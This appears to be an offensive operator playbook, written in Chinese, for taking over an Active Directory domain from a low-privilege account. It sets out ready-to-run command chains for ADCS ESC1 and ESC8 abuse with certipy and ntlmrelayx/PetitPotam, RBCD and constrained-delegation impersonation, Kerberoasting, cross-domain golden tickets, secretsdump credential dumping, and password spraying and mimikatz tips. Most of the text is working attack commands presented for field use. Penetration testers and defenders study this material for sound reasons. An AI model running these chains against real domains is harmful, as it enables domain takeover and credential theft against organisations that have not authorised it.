# AD-CS 与委派（域内提权域控的最短路径）

> **触发**：已经拿下域内任意一个低权账户（域用户 / 机器账户），且 `net user /domain`、`nltest /dsgetdc:` 有响应。
> **为什么这页必须存在**：2026 年域环境里，**ADCS 配错（ESC 系列）+ 委派 + 中继** 是从"域用户"到"域管"最短的路；
> 而 Kerberoasting/AS-REP 只在特定条件下有效（详见本页 §假点）。旧教材只讲 BloodHound + Kerberoasting，会漏掉大半攻击面。

---

## 一、先确认"域"存在（30 秒）

```cmd
:: Windows 落脚点
whoami /user & whoami /groups | findstr /i "domain"
net time /domain                     :: 返回 DC 名 = 在域里
nltest /dsgetdc:<domain>             :: 拿 DC 的 IP
```
```bash
# Linux 落脚点
net ads info -S <DC_IP>              # 需要 samba
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts   # 拿 namingcontext（DC=xx,DC=com）
```

**判据**：只要能做 LDAP 查询 ⇒ 后面所有攻击（ADCS 枚举、委派、Kerberos）都可离线态发起，**不需要先进域内主机**。

---

## 二、★ ADCS（证书服务）—— 现在最热的一条路

> 一句话原理：企业 CA 签发的证书可以**代表某个身份去 Kerberos 认证**。
> 如果**证书模板配置错**，就能申请到"代表域管"的证书 ⇒ 直接提权。
> 危险点编号 ESC1~ESC15（本页收最常用的）。

### 2.1 枚举（先做这个）

```bash
# 找 CA（LDAP 查 pKIEnrollmentService 对象）
ldapsearch -x -H ldap://<DC_IP> -b "CN=Configuration,DC=xx,DC=com" \
  "(objectClass=pKIEnrollmentService)" name dNSHostname cACertificate
# → 拿到 CA 名与 CA 主机，形如 CA01.corp.local\CORP-CA
```

```powershell
# Windows 侧（无工具也能枚举）
certutil -TCAInfo                                  # 列企业 CA
certutil -Template                                 # 列可注册模板
certutil -CATemplates                              # 列 CA 已发布模板
```

**用 Certipy（Kali/域内 Linux 最常用）**：
```bash
# 注意：本机实测【缺 certipy】—— 现场需现场装：
#   pip install certipy-ad    或    apt install certipy-ad
certipy-ad find -u 'user@corp.local' -p 'Passw0rd' -dc-ip <DC_IP> -vulnerable -stdout
```

**输出里重点看哪些模板有**：
```
[!] Vulnerabilities
      ESC1 : Enrollee Supplies Subject == True  且  Client Authentication == True
            且 无 Manager Approval 且 无授权签名要求
```

### 2.2 ESC1：最常见的 ADCS 提权

**四个条件必须同时满足**（任一不满足就走别的 ESC）：
1. `msPKI-Certificate-Name-Flag` 含 **`ENROLLEE_SUPPLIES_SUBJECT`**（申请人可自填 subject）
2. 模板 EKU 含 **Client Authentication**（能用来做 Kerberos PKINIT）
3. CA/模板**不需要管理员审批**（`msPKI-Enrollment-Flag` 无 `PEND_ALL_REQUESTS`）
4. 低权用户对该模板**有注册权限**

```bash
# ① 申请"代表域管"的证书（自填 SAN = 域管的 UPN）
certipy-ad req -u 'user@corp.local' -p 'Passw0rd' -dc-ip <DC_IP> \
  -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn 'administrator@corp.local' -sid 'S-1-5-21-....-500'
# ★ 2022-05 之后的新 DC 必须带 -sid（否则签发出来不能用）

# ② 用证书换域管 NT hash（PKINIT）
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
# → 输出 administrator 的 NT hash ⇒ PTH 打域控
```

**★ 关键假点（2026-02 实测来源）**：
- **模板只带 ServerAuth EKU 是死路** —— 申请会报 `KDC_ERR_INCONSISTENT_KEY_PURPOSE`（报得出来但打不动）。
  此时**换路线**：`certipy-ad auth -pfx x.pfx -ldap-shell` ⇒ 用证书直接拿 LDAP 写权限（可改用户密码/加组），**不需要 Kerberos 认证**。
- **证书申请成功 ≠ 能用**：先看 `KDC_ERR_*` 具体码，别反复重试同一路径。

### 2.3 ESC8：NTLM 中继打 CA 的 Web 注册端点

**原理**：CA 的 HTTP 注册接口（`/certsrv/certfnsh.asp`）默认支持 NTLM 认证 ⇒ 中继域控/域管的认证过来，**以对方身份申请证书**。

```bash
# ① 起中继（目标 = CA 的 Web 端点）
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
# ② 触发目标回连（PetitPotam / PrinterBug / DFSCoerce 三选一）
python3 PetitPotam.py <攻击机IP> <DC_IP>
# ③ 中继成功 → 拿到 DC 的证书（base64）→ 换 DC 的 hash
certipy-ad auth -pfx dc.pfx -dc-ip <DC_IP>
```

**实测失败案例（GOAD 报告）**：ESC8 中继**因"跨域注册未开"而失败** ⇒ 别默认它一定能成，先用 §2.1 枚举确认 CA 的注册端点是否对本域开放。

---

## 三、委派（Delegation）—— 三类，判据完全不同

| 类型 | 怎么认 | 怎么打 |
|---|---|---|
| **非约束委派**<br>Unconstrained | 机器/用户对象属性 `userAccountControl` 含 **`TRUSTED_FOR_DELEGATION`**（0x80000） | 诱使**该对象**来认证 ⇒ 捕获其 TGT ⇒ `Rubeus ptt` / impacket 导入后 DCSync |
| **约束委派**<br>Constrained | 有 `msDS-AllowedToDelegateTo` 列表 | 拿该对象的 hash ⇒ `impacket-getST -spn <允许的SPN> -impersonate administrator` ⇒ 换服务票据 |
| **基于资源的约束委派**<br>RBCD | 目标机器对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 被写了 | 需要先能**写目标对象属性**（GenericWrite/WriteDACL）⇒ 写 RBCD ⇒ `getST` |

```bash
# 枚举委派（impacket 自带，本机【有】:/mnt/c/tools/impacket-src/examples/findDelegation.py）
impacket-findDelegation 'corp.local/user:Passw0rd' -dc-ip <DC_IP>
```

```bash
# RBCD 四步（典型链：GenericWrite → RBCD → 域管）
# ① 确认能写目标（BloodHound: GenericWrite/GenericAll 指向计算机对象）
# ② 造一台自己的机器账户
impacket-addcomputer 'corp.local/user:Passw0rd' -dc-ip <DC_IP> \
  -computer-name 'FAKE$' -computer-pass 'Fake123!'
# ③ 写目标的 RBCD 指向 FAKE$
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write \
  'corp.local/user:Passw0rd' -dc-ip <DC_IP>
# ④ 用 FAKE$ 假冒域管拿票据
impacket-getST -spn cifs/TARGET.corp.local -impersonate administrator \
  'corp.local/FAKE$:Fake123!' -dc-ip <DC_IP>
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass TARGET.corp.local
```

**BloodHound 边 → 命令映射**（来自 redamon AD Kill Chain，本机无 BloodHound 也可手查 LDAP）：

| BloodHound 边 | 落地命令 |
|---|---|
| `GenericAll` / `ForceChangePassword` | 直接改目标密码（`bloodyAD set password` / `net user x y /domain`） |
| `WriteDACL` | `impacket-dacledit -action write -rights FullControl` ⇒ 给自己加 DCSync 权限 |
| `WriteOwner` | 改 owner 后写 DACL（同上） |
| `ReadGMSAPassword` | `gMSADumper.py` / `certipy-ad` 读 gMSA 密码 |
| `AllowedToAct` | RBCD 三步（见上） |

---

## 四、Kerberos 两条"经典但常失效"的路

### AS-REP Roasting（不需预认证的账户）

```bash
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
```
**成立条件**：目标账户 `userAccountControl` 含 **`DONT_REQ_PREAUTH`**（0x400000）。**没有这个标志就打不出来**。
**判据**：枚举时若一个用户都拿不到 → 不是姿势错，是**这个域没有关预认证的账户**，别耗。

### Kerberoasting（有 SPN 的服务账户）

```bash
impacket-GetUserSPNs 'corp.local/user:Passw0rd' -dc-ip <DC_IP> -request
# → $krb5tgs$ 哈希 → hashcat -m 13100
```
**成立条件**：存在**带 SPN 且密码弱**的服务账户（多为历史遗留的服务账号）。
**判据**：拿得到票据 ≠ 能出密码。**要离线爆破**（`-m 13100`）；现代域常是长随机密码 ⇒ **爆不出来就换 ADCS/委派线**，别在 hashcat 上挂 20 分钟。

---

## 五、信任关系（多域/林场景）

| 关系 | 利用 |
|---|---|
| 子域 → 父域 | `krbtgt` 的信任密钥可造**跨域黄金票据**；也可用 `ExtraSid` 注入（`-extra-sid 519` = 企业管理员） |
| 双向信任 | 两个方向都可打；先打"防护更弱的那个域" |
| 林外信任 | 需要显式信任密钥（`trustKey`） |

```bash
# 跨域黄金票据（已知父域 SID 与信任密钥时）
impacket-ticketer -nthash <trust_key> -domain corp.local -domain-sid <子域SID> \
  -extra-sid <父域SID>-519 administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass -target-ip <父域DC_IP> dc.parent.local
```

---

## 六、★ 假点清单（这一页最值钱的部分）

1. **`proxychains nmap -sS` 扫不出东西** —— SOCKS 只承载完整 TCP 连接，半开扫描的原始包不走代理 ⇒ **一律 `-sT -Pn`**。
2. **SYSTEM 权限跑 mimikatz 抓不到明文** —— lsass 里存的是"**当前登录用户**"的凭据，SYSTEM 不是登录用户 ⇒ 必须**注入 Administrator 进程**或降权后重抓。
3. **PTH 全报 `STATUS_LOGON_FAILURE`** —— hash 对但**账户名不匹配**：换账户名，或加 `--local-auth`（本地账户而非域账户），或先用明文验证一次确认通道。
4. **内网目标永远不回连** —— 反弹目标必须是**跳板机的内网 IP**，不是你的攻击机 IP。回连不通 ⇒ 改**正向上线**（监听在靶机可达的一侧）。
5. **ESC1 报得出来打不动** —— 看 EKU（只有 ServerAuth 就是死路）⇒ 走 `certipy auth -ldap-shell`。
6. **ADCS 枚举不到** —— 不代表没有：可能是**该账户没有对 CA 的读权限** ⇒ 换域内更高权限账户重试。
7. **喷洒把全域锁死** —— 喷洒前**必须先读锁定策略**：`nxc smb <DC> --pass-pol` ⇒ 上限 = `LOCKOUT_THRESHOLD - 2`，**阈值 ≤2 时禁止喷洒**；两次不同口令间隔 ≥30 分钟。
8. **血管图（BloodHound）跑不出路径** —— 先确认采集时用的是**域管/有读权限的账户**，否则 ACL 边采不全，得出的"没路径"是假的。
9. **ZeroLogon 打完域崩** —— 重置机器账户口令后**必须还原**（`restorepassword.py DC$@DC -target-ip <IP> -hexpass <hex>`）。
10. **`net time /domain` 报 RPC 错误** —— 域控防火墙挡了 RPC，不代表出了域；改用 LDAP 389 验证连通。

---

## 七、本机工具实况（2026-10 实测，写命令前先看这里）

| 工具 | 状态 | 说明 |
|---|---|---|
| `impacket`（GetUserSPNs / GetNPUsers / findDelegation / ntlmrelayx / secretsdump / dacledit / rbcd / addcomputer / getST / ticketer） | ✅ **有** | WSL `/usr/bin/impacket-*`；**全量脚本在** `/mnt/c/tools/impacket-src/examples/`（用 `wsl -d ghost -- python3 该路径/xxx.py` 跑） |
| `ldap3`（Python 库） | ✅ 有 | 可自己写 LDAP 枚举 |
| **certipy-ad**（ADCS 必用） | ❌ **缺** | 现场装：`pip install certipy-ad`（或 apt）。**没它就打不了 ADCS** ⇒ 落地前先确认 |
| **Rubeus / SharpHound / BloodHound** | ❌ 缺 | 现场从平台工具库取，或传 Windows 侧 exe |
| **kerbrute** | ❌ 缺 | 枚举用户名可用 ldapsearch 替代 |

> **部署纪律**：进内网前先解决 `certipy-ad`，否则看到 ADCS 也打不动；Windows 侧工具（Rubeus/SharpHound）优先从**平台工具库**取。

---

## 八、最短路径决策（15 秒判断该走哪条）

```
拿到域内任意账户
  │
  ├─ 能 LDAP 查询？ ──否── 先解决 LDAP 连通（389/636），否则后面都做不了
  │                    │是
  │                    ▼
  ├─ 域里有 ADCS（pKIEnrollmentService 有对象）？
  │     │是                                        │否
  │     ▼                                          ▼
  │   跑 certipy find -vulnerable              看委派（findDelegation）
  │     ├─ 有 ESC1（可自填 subject）→ 申请域管证书 → 域管 hash    ├─ 非约束 → 诱捕 TGT
  │     ├─ 有 ESC8（Web 注册）→ NTLM 中继 + PetitPotam           ├─ 约束 → getST 冒充
  │     └─ 都无 → 看 BloodHound ACL 边 → RBCD/WriteDACL          └─ RBCD → 需先能写对象属性
  │
  ├─ 有 Kerberoastable 服务账户且密码弱？ → hashcat -m 13100（长密码别耗）
  └─ 有 DONT_REQ_PREAUTH 账户？ → AS-REP（没有就打不出）
```
